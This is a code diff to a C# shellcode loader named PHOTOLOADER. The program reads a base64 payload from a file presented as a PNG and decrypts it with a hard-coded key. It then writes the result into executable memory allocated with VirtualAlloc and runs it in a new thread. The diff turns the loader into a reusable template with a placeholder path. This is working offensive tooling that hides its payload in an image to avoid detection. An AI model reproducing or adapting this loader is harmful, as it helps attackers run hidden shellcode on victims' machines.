@@ -9,7 +9,7 @@ namespace PHOTOLOADER
     {
 
 
-        [DllImport("kernel32")]
+        [DllImport("kernel32.dll")]
         public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
         [DllImport("kernel32.dll", SetLastError = true)]
@@ -100,17 +100,14 @@ namespace PHOTOLOADER
         }
         static void Main(string[] args) {
 
-            string file = $"{Environment.CurrentDirectory}//test.png";
+            string file = $"[PNG PATH HERE]";
 
-            byte[] encrypted = Apply(Convert.FromBase64String(System.IO.File.ReadAllText(file)), Encoding.UTF8.GetBytes("thisisakey"));
-            //Console.WriteLine(Convert.ToBase64String(encrypted));
+            byte[] encrypted = Convert.FromBase64String(System.IO.File.ReadAllText(file));
 
             byte[] shellcode = Apply(encrypted, Encoding.UTF8.GetBytes("thisisakey"));
-            //Console.WriteLine(Encoding.UTF8.GetString(gibitbak));
 
             var addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x00001000, 0x40);
             Marshal.Copy(shellcode, 0, addr, shellcode.Length);
-            //memcpy(addr, buf, sizeof buf);
             var res = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
             WaitForSingleObject(res, 0xFFFFFFF);
 
